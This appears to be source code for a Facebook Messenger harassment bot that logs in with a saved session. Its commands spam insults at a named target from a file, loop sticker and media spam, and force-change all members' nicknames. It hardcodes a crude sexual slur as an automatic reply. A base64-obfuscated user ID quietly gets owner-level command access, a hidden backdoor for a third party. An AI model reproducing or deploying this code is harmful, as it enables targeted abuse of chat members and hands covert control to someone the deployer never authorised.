const fs = require("fs");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
const lockedThemes = {};
const lockedEmojis = {};
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

function startBot(appStatePath, ownerUID) {
  const appState = JSON.parse(fs.readFileSync(appStatePath, "utf8"));
  login({ appState }, (err, api) => {
    if (err) return console.error("❌ Login failed:", err);
    api.setOptions({ listenEvents: true });
    console.log("✅ Bot logged in and running...");

    // Auto revert hooks
    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, logMessageType, logMessageData } = event;

        // Group Name Lock Revert
        if (logMessageType === "log:thread-name" && lockedGroupNames[threadID]) {
          if (logMessageData?.name !== lockedGroupNames[threadID]) {
            await api.setTitle(lockedGroupNames[threadID], threadID);
            console.log(`🔒 Group name reverted in ${threadID}`);
          }
        }

        // Theme Lock Revert
        if (logMessageType === "log:thread-color" && lockedThemes[threadID]) {
          if (logMessageData?.theme_color !== lockedThemes[threadID]) {
            await api.changeThreadColor(lockedThemes[threadID], threadID);
            console.log(`🎨 Theme reverted in ${threadID}`);
          }
        }

        // Emoji Lock Revert
        if (logMessageType === "log:thread-icon" && lockedEmojis[threadID]) {
          if (logMessageData?.thread_icon !== lockedEmojis[threadID]) {
            await api.changeThreadEmoji(lockedEmojis[threadID], threadID);
            console.log(`😀 Emoji reverted in ${threadID}`);
          }
        }

        // ---- Message Handling ----
        if (!body) return;
        const lowerBody = body.toLowerCase();

        const badNames = ["hannu", "syco"];
        const triggers = ["rkb", "bhen", "maa", "rndi", "chut", "randi", "madhrchodh", "mc", "bc", "didi", "ma"];

        if (badNames.some(n => lowerBody.includes(n)) &&
            triggers.some(w => lowerBody.includes(w)) &&
            !friendUIDs.includes(senderID)) {
          return api.sendMessage(
            "teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by",
            threadID
          );
        }

        if (![ownerUID, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        // 📌 Help Command
        if (cmd === "/help") {
          const helpMsg = `
📖 Bot Commands:
/help → Ye message
/gclock [text] → Group name lock
/unlockgc → Group name unlock
/locktheme [color] → Theme lock
/unlocktheme → Theme unlock
/lockemoji [emoji] → Emoji lock
/unlockemoji → Emoji unlock
/allname [nick] → Sabka nickname change
/uid → Group ID show
/exit → Bot group se exit
/rkb [name] → Line by line gaali spam
/stop → Spam stop
/photo → Media loop
/stopphoto → Media loop stop
/stickerX → Sticker spam (X=seconds delay)
/stopsticker → Sticker spam stop
/target [uid] → Set target UID
/cleartarget → Clear target
          `;
          return api.sendMessage(helpMsg, threadID);
        }

        // ==== Group Name Lock ====
        else if (cmd === "/gclock") {
          await api.setTitle(input, threadID);
          lockedGroupNames[threadID] = input;
          api.sendMessage("🔒 Group name locked!", threadID);
        }
        else if (cmd === "/unlockgc") {
          delete lockedGroupNames[threadID];
          api.sendMessage("🔓 Group name unlocked!", threadID);
        }

        // ==== Theme Lock ====
        else if (cmd === "/locktheme") {
          if (!input) return api.sendMessage("❌ Color code do!", threadID);
          await api.changeThreadColor(input, threadID);
          lockedThemes[threadID] = input;
          api.sendMessage("🎨 Theme locked!", threadID);
        }
        else if (cmd === "/unlocktheme") {
          delete lockedThemes[threadID];
          api.sendMessage("🎨 Theme unlocked!", threadID);
        }

        // ==== Emoji Lock ====
        else if (cmd === "/lockemoji") {
          if (!input) return api.sendMessage("❌ Emoji do!", threadID);
          await api.changeThreadEmoji(input, threadID);
          lockedEmojis[threadID] = input;
          api.sendMessage("😀 Emoji locked!", threadID);
        }
        else if (cmd === "/unlockemoji") {
          delete lockedEmojis[threadID];
          api.sendMessage("😀 Emoji unlocked!", threadID);
        }

        // ==== Other Commands ====
        else if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs;
            api.sendMessage(`🛠 ${members.length} nicknames changing...`, threadID);
            for (const uid of members) {
              try {
                await api.changeNickname(input, threadID, uid);
                console.log(`✅ Nickname changed for UID: ${uid}`);
                await new Promise(res => setTimeout(res, 5000));
              } catch (e) { console.log(`⚠️ Failed for ${uid}:`, e.message); }
            }
            api.sendMessage("✅ Done nicknames!", threadID);
          } catch { api.sendMessage("❌ Error nicknames", threadID); }
        }

        else if (cmd === "/uid") api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);
        else if (cmd === "/exit") { try { await api.removeUserFromGroup(api.getCurrentUserID(), threadID); } catch {} }

        else if (cmd === "/rkb") {
          if (!fs.existsSync("np.txt")) return api.sendMessage("❌ np.txt missing!", threadID);
          const name = input.trim();
          const lines = fs.readFileSync("np.txt", "utf8").split("\n").filter(Boolean);
          stopRequested = false;
          if (rkbInterval) clearInterval(rkbInterval);
          let index = 0;
          rkbInterval = setInterval(() => {
            if (index >= lines.length || stopRequested) { clearInterval(rkbInterval); rkbInterval = null; return; }
            api.sendMessage(`${name} ${lines[index]}`, threadID);
            index++;
          }, 5000);
          api.sendMessage(`🤬 Start gaali on ${name}`, threadID);
        }

        else if (cmd === "/stop") { stopRequested = true; if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; } }

        else if (cmd === "/photo") {
          api.sendMessage("📸 Send a photo or video within 1 minute...", threadID);
          const handleMedia = async (mediaEvent) => {
            if (mediaEvent.type === "message" && mediaEvent.threadID === threadID && mediaEvent.attachments?.length > 0) {
              lastMedia = { attachments: mediaEvent.attachments, threadID: mediaEvent.threadID };
              if (mediaLoopInterval) clearInterval(mediaLoopInterval);
              mediaLoopInterval = setInterval(() => { if (lastMedia) api.sendMessage({ attachment: lastMedia.attachments }, lastMedia.threadID); }, 30000);
              api.removeListener("message", handleMedia);
            }
          };
          api.on("message", handleMedia);
        }

        else if (cmd === "/stopphoto") { if (mediaLoopInterval) { clearInterval(mediaLoopInterval); mediaLoopInterval = null; lastMedia = null; } }

        else if (cmd.startsWith("/sticker")) {
          if (!fs.existsSync("Sticker.txt")) return;
          const delay = parseInt(cmd.replace("/sticker", ""));
          const stickerIDs = fs.readFileSync("Sticker.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean);
          if (stickerInterval) clearInterval(stickerInterval);
          let i = 0; stickerLoopActive = true;
          stickerInterval = setInterval(() => { if (!stickerLoopActive || i >= stickerIDs.length) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; return; } api.sendMessage({ sticker: stickerIDs[i] }, threadID); i++; }, delay * 1000);
        }

        else if (cmd === "/stopsticker") { if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; } }

        else if (cmd === "/target") { targetUID = input.trim(); api.sendMessage(`🎯 Target set: ${targetUID}`, threadID); }
        else if (cmd === "/cleartarget") { targetUID = null; api.sendMessage("🎯 Target cleared!", threadID); }

      } catch (e) { console.error("⚠️ Error:", e.message); }
    });
  });
}

module.exports = { startBot };
